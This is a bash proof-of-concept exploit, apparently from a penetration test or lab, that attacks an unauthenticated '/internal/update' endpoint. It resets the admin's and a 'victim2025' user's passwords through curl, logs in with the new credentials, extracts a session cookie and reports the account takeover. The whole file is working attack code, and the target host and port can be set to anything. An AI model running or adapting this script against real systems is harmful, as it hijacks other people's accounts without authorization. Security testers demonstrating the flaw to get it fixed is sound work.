#!/bin/bash

# POC: Unauthenticated Password Reset - Arbitrary User Account Takeover
# Target: /internal/update endpoint
# Vulnerability: No authentication, no CSRF tokens, no rate limiting

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-3000}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "================================================"
echo "POC: Unauthenticated Password Reset Vulnerability"
echo "================================================"
echo "Target: $BASE_URL"
echo ""

# Test 1: Reset admin password
echo "[*] Test 1: Attempting to reset admin password..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$BASE_URL/internal/update?username=admin&newpassword=hacked123")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] Response Status: $HTTP_CODE"
echo "[*] Response Body: $BODY"

if [[ "$HTTP_CODE" == "200" && "$BODY" == *"Password reset successfully"* ]]; then
    echo "[+] SUCCESS: Admin password reset successful!"
    
    # Test 2: Verify by logging in with new password
    echo ""
    echo "[*] Test 2: Attempting to login with reset password (admin/hacked123)..."
    LOGIN_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$BASE_URL/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=admin&password=hacked123" \
        -L)
    LOGIN_HTTP_CODE=$(echo "$LOGIN_RESPONSE" | tail -n1)
    LOGIN_BODY=$(echo "$LOGIN_RESPONSE" | head -n-1)
    
    echo "[*] Login Response Status: $LOGIN_HTTP_CODE"
    
    if [[ "$LOGIN_HTTP_CODE" == "200" || "$LOGIN_HTTP_CODE" == "302" ]]; then
        echo "[+] SUCCESS: Login successful with reset password!"
        
        # Extract session cookie if present
        COOKIE=$(echo "$LOGIN_BODY" | grep -i "Set-Cookie" | head -1 | cut -d' ' -f2 | cut -d';' -f1)
        if [ ! -z "$COOKIE" ]; then
            echo "[+] Session Cookie obtained: ${COOKIE:0:20}..."
        fi
    else
        echo "[-] Login failed - HTTP $LOGIN_HTTP_CODE"
    fi
else
    echo "[-] FAILED: Password reset returned HTTP $HTTP_CODE"
    echo "[-] Response: $BODY"
    exit 1
fi

# Test 3: Reset arbitrary user password
echo ""
echo "[*] Test 3: Attempting to reset arbitrary user password (victim2025)..."
VICTIM_RESPONSE=$(curl -s -w "\n%{http_code}" "$BASE_URL/internal/update?username=victim2025&newpassword=hijacked")
VICTIM_HTTP_CODE=$(echo "$VICTIM_RESPONSE" | tail -n1)
VICTIM_BODY=$(echo "$VICTIM_RESPONSE" | head -n-1)

echo "[*] Response Status: $VICTIM_HTTP_CODE"
echo "[*] Response Body: $VICTIM_BODY"

if [[ "$VICTIM_HTTP_CODE" == "200" && "$VICTIM_BODY" == *"Password reset successfully"* ]]; then
    echo "[+] SUCCESS: Arbitrary user password reset successful!"
    
    # Test 4: Verify arbitrary user login
    echo ""
    echo "[*] Test 4: Attempting to login as victim2025 with reset password..."
    VICTIM_LOGIN=$(curl -s -w "\n%{http_code}" -X POST "$BASE_URL/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=victim2025&password=hijacked" \
        -L)
    VICTIM_LOGIN_CODE=$(echo "$VICTIM_LOGIN" | tail -n1)
    
    echo "[*] Victim Login Response Status: $VICTIM_LOGIN_CODE"
    
    if [[ "$VICTIM_LOGIN_CODE" == "200" || "$VICTIM_LOGIN_CODE" == "302" ]]; then
        echo "[+] SUCCESS: Victim account takeover successful!"
    fi
else
    echo "[-] FAILED: Victim password reset returned HTTP $VICTIM_HTTP_CODE"
fi

echo ""
echo "================================================"
echo "POC SUMMARY"
echo "================================================"
echo "[!] CRITICAL VULNERABILITY CONFIRMED"
echo "[!] Endpoint allows unauthenticated password reset"
echo "[!] No authentication headers required"
echo "[!] No CSRF tokens required"
echo "[!] Arbitrary user accounts can be taken over"
echo "[!] Admin accounts vulnerable to compromise"
echo "================================================"